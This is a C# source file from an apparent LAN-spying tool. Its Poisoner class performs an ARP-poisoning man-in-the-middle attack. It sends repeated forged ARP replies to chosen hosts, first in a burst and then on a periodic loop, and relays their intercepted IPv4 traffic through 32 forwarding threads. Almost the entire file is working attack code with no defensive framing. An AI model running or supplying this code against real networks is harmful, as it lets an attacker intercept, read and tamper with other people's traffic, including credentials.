using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;

namespace LAN_Spy {
    /// <summary>
    ///     ARP毒化器。
    /// </summary>
    public class Poisoner : BasicClass {
        /// <summary>
        ///     毒化目标。
        /// </summary>
        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
        
        /// <summary>
        ///     默认网关。
        /// </summary>
        public Host Gateway = null;

        /// <summary>
        ///     使用设备缓存。
        /// </summary>
        private ICaptureDevice _device;

        /// <summary>
        ///     毒化目标缓存。
        /// </summary>
        private List<Host> _target1, _target2;

        /// <summary>
        ///     默认网关缓存。
        /// </summary>
        private Host _gateway;

        /// <summary>
        ///     毒化线程句柄
        /// </summary>
        private readonly List<Thread> _poisonThreads = new List<Thread>();
        
        /// <summary>
        ///     包转发线程句柄
        /// </summary>
        private readonly List<Thread> _retransmissionThreads = new List<Thread>();

        /// <summary>
        ///     根据设定的 <see cref="List{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
        /// <exception cref="NullReferenceException">未设置默认网关。</exception>
        public void StartPoisoning() {
            // 判断是否有未停止的毒化工作
            if (_poisonThreads.Count > 0)
                throw new InvalidOperationException("已有一项毒化工作正在进行。");
            
            // 深复制以缓存目标
            _target1 = new List<Host>();
            _target2 = new List<Host>();
            foreach (var target in Target1)
                _target1.Add(new Host(target.IPAddress, target.PhysicalAddress));
            foreach (var target in Target2)
                _target2.Add(new Host(target.IPAddress, target.PhysicalAddress));
            
            // 缓存网关
            _gateway = Gateway ?? throw new NullReferenceException("未设置默认网关。");

            // 缓存并打开当前设备
            if (!(_device = DeviceList[CurDevIndex]).Started) {
                _device.OnPacketArrival += Device_OnPacketArrival;
                _device.Open();
                _device.Filter = "arp or ip";
                _device.StartCapture();
            }
            
            // 创建包转发线程
            for (int i = 0; i < 32; i++) {
                Thread retransmissionThread = new Thread(RetransmissionThread);
                retransmissionThread.Start();
                _retransmissionThreads.Add(retransmissionThread);
            }

            // 开始毒化
            foreach (var target in _target1) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
            foreach (var target in _target2) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
        }

        /// <summary>
        ///     毒化线程。
        /// </summary>
        /// <param name="obj">毒化的目标。</param>
        private void PoisonThread(object obj) {
            try {
                // 获取目标
                var host = (Host) obj;
                
                // 转存目标
                var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
                
                // 构建包信息
                EthernetPacket ether = new EthernetPacket(_device.MacAddress,
                    host.PhysicalAddress,
                    EthernetPacketType.Arp);
                ARPPacket arp = new ARPPacket(ARPOperation.Response,
                    host.PhysicalAddress,
                    host.IPAddress,
                    _device.MacAddress,
                    new IPAddress(new byte[] {0, 0, 0, 0})) {
                    HardwareAddressType = LinkLayers.Ethernet,
                    ProtocolAddressType = EthernetPacketType.IpV4
                };
                ether.PayloadPacket = arp;
                arp.ParentPacket = ether;
                
                // 强毒化
                for (int i = 0; i < 20; i++) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(500);
                }

                // 弱毒化
                while (true) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(5 * 1000);
                }
            }
            catch (ThreadAbortException) { }
        }

        /// <summary>
        ///     包转发线程。
        /// </summary>
        private void RetransmissionThread() {
            try {
                while (true) {
                    // 从队列中请求一个数据包
                    RawCapture packet;
                    if ((packet = NextRawCapture) != null) {
                        // 分析数据包中的数据
                        EthernetPacket ether = new EthernetPacket(new ByteArraySegment(packet.Data));

                        // 由本机发出的数据包，忽略
                        if (ether.SourceHwAddress.ToString().Equals( _device.MacAddress.ToString())) continue;

                        if (ether.Type == EthernetPacketType.IpV4) {
                            // 解析IPv4包
                            IPv4Packet ipv4Packet = (IPv4Packet) ether.PayloadPacket;

                            // 检查数据包源和目的是否在目标列表中
                            Host src = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) ??
                                       _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())),
                                dest = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
                                       _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
                            
                            // 两组间发送的数据包
                            if (_target1.Contains(src) && _target2.Contains(dest) ||
                                _target2.Contains(src) && _target1.Contains(dest))
                                ether.DestinationHwAddress = dest.PhysicalAddress;
                            // 组1或组2发送到外网的数据包
                            else if ((_target1.Contains(src) || _target2.Contains(src)) && dest == null)
                                ether.DestinationHwAddress = _gateway.PhysicalAddress;
                            // 外网发送给组1或组2的数据包
                            else if ((_target1.Contains(dest) || _target2.Contains(dest)) && src == null)
                                ether.DestinationHwAddress = dest.PhysicalAddress;
                            // 不需要转发数据包
                            else
                                continue;
                            
                            // 转发数据包到指定目标
                            ether.SourceHwAddress = _device.MacAddress;
                            _device.SendPacket(ether);
                        }
                        else if (ether.Type == EthernetPacketType.Arp) {
                            // 解析ARP包
                            ARPPacket arp = (ARPPacket) ether.PayloadPacket;

                            // 仅处理ARP请求包
                            if (arp.Operation != ARPOperation.Request) continue;

                            // 检查数据包源和目的是否在目标列表中
                            Host src = _target1.Find(item => item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString())) ??
                                       _target2.Find(item => item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString())),
                                dest = _target1.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString())) ??
                                       _target2.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString()));
                            
                            // 非两组间发送的数据包，跳过
                            if ((!_target1.Contains(src) || !_target2.Contains(dest)) &&
                                (!_target2.Contains(src) || !_target1.Contains(dest))) continue;

                            // 构建包信息
                            EthernetPacket e = new EthernetPacket(_device.MacAddress,
                                arp.SenderHardwareAddress,
                                EthernetPacketType.Arp);
                            ARPPacket a = new ARPPacket(ARPOperation.Response,
                                arp.SenderHardwareAddress,
                                arp.SenderProtocolAddress,
                                _device.MacAddress,
                                arp.TargetProtocolAddress) {
                                HardwareAddressType = LinkLayers.Ethernet,
                                ProtocolAddressType = EthernetPacketType.IpV4
                            };
                            e.PayloadPacket = a;
                            a.ParentPacket = e;

                            // 发送响应包到指定目标
                            _device.SendPacket(e);
                        }
                    } else {
                        // 队列尚未获得数据，挂起等待
                        Thread.Sleep(100);
                    }
                }
            } catch (ThreadAbortException) { }
        }

        /// <summary>
        ///     停止ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="TimeoutException">等待线程结束超时。</exception>
        public void StopPoisoning() {
            // 清理缓冲区
            ClearCaptures();

            // 向毒化线程发送终止信号
            foreach (var poisonThread in _poisonThreads)
                if (poisonThread.IsAlive)
                    poisonThread.Abort();
            
            // 等待毒化线程终止
            int waitTime = 60 * 1000;
            while (waitTime >= 0) {
                waitTime = -waitTime;
                foreach (var poisonThread in _poisonThreads)
                    if (poisonThread.IsAlive) {
                        Thread.Sleep(100);
                        if ((waitTime = -waitTime - 100) == 0)
                            throw new TimeoutException("等待线程结束超时。");
                        break;
                    }
            }
            _poisonThreads.Clear();

            // 向包转发线程发送终止信号
            foreach (var retransmissionThread in _retransmissionThreads)
                if (retransmissionThread.IsAlive)
                    retransmissionThread.Abort();
            
            // 等待包转发线程终止
            waitTime = 60 * 1000;
            while (waitTime >= 0) {
                waitTime = -waitTime;
                foreach (var retransmissionThread in _retransmissionThreads)
                    if (retransmissionThread.IsAlive) {
                        Thread.Sleep(100);
                        if ((waitTime = -waitTime - 100) == 0)
                            throw new TimeoutException("等待线程结束超时。");
                        break;
                    }
            }
            _retransmissionThreads.Clear();
            
            // 关闭设备
            if (!(_device = DeviceList[CurDevIndex]).Started) return;
            _device.OnPacketArrival -= Device_OnPacketArrival;
            _device.StopCapture();
            _device.Close();
        }
    }
}
